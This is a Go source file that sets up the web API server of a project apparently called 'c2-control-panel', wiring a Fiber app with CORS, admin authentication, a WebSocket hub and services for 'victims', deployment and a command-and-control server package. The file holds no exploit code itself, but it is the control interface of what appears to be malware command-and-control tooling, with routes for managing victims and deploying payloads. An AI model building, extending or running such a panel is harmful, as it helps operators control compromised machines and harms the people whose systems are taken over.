package api

import (
	"database/sql"
	"log"
	"os"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/cors"
	"github.com/gofiber/fiber/v2/middleware/logger"
	fiberws "github.com/gofiber/websocket/v2"

	"c2-control-panel/api/controllers"
	"c2-control-panel/api/routes"
	"c2-control-panel/api/services"
	"c2-control-panel/c2server"
	"c2-control-panel/websocket"
)

type Server struct {
	Address  string
	DB       *sql.DB
	Hub      *websocket.Hub
	C2Server *c2server.Server
	App      *fiber.App
}

func NewServer(address string, db *sql.DB, hub *websocket.Hub, c2 *c2server.Server) *Server {
	app := fiber.New(fiber.Config{
		AppName:      "C2 Control Panel API",
		UnescapePath: true,
	})

	return &Server{
		Address:  address,
		DB:       db,
		Hub:      hub,
		C2Server: c2,
		App:      app,
	}
}

func (s *Server) Start() error {
	log.Println("[API] Configuring middleware...")
	s.App.Use(logger.New())

	corsOrigin := os.Getenv("CORS_ORIGIN")
	if corsOrigin == "" {
		corsOrigin = "http://localhost:3000,https://funnychistoso-panel.vercel.app"
	}
	corsMiddleware := cors.New(cors.Config{
		AllowOrigins:     corsOrigin,
		AllowCredentials: true,
		AllowMethods:     "GET,POST,PUT,DELETE,OPTIONS",
		AllowHeaders:     "Origin, Content-Type, Accept, Authorization",
	})

	log.Println("[API] Initializing services...")
	// Wire up services → controllers → routes
	victimsService := services.NewVictimsService(s.C2Server)
	victimsController := controllers.NewVictimsController(victimsService)

	authService := services.NewAuthServicePostgres(s.DB)
	authController := controllers.NewAuthController(authService)

	deploymentService := services.NewDeploymentService()
	deploymentController := controllers.NewDeploymentController(deploymentService)

	log.Println("[API] Initializing auth service (creates admin if needed)...")
	// Initialize auth (creates admin user if doesn't exist)
	if err := authService.Initialize(); err != nil {
		log.Printf("[!] Failed to initialize auth: %v", err)
	} else {
		log.Println("[✓] Auth service initialized successfully")
	}

	log.Println("[API] Registering routes...")
	// CORS scoped to API only — keeps WebSocket upgrade clean
	api := s.App.Group("/api", corsMiddleware)
	routes.RegisterVictimRoutes(api, victimsController)
	routes.RegisterAuthRoutes(api, authController)
	routes.RegisterAdminRoutes(api, deploymentController)

	s.App.Get("/health", corsMiddleware, func(c *fiber.Ctx) error {
		return c.JSON(fiber.Map{"status": "ok"})
	})

	log.Println("[API] Configuring WebSocket endpoint...")
	// WebSocket — no CORS middleware, browser handles WS origin natively
	s.App.Use("/ws", func(c *fiber.Ctx) error {
		if fiberws.IsWebSocketUpgrade(c) {
			c.Locals("allowed", true)
			return c.Next()
		}
		return fiber.ErrUpgradeRequired
	})
	s.App.Get("/ws", fiberws.New(func(c *fiberws.Conn) {
		s.Hub.HandleConnection(c)
	}))

	log.Printf("[API] Starting server on %s...", s.Address)
	return s.App.Listen(s.Address)
}
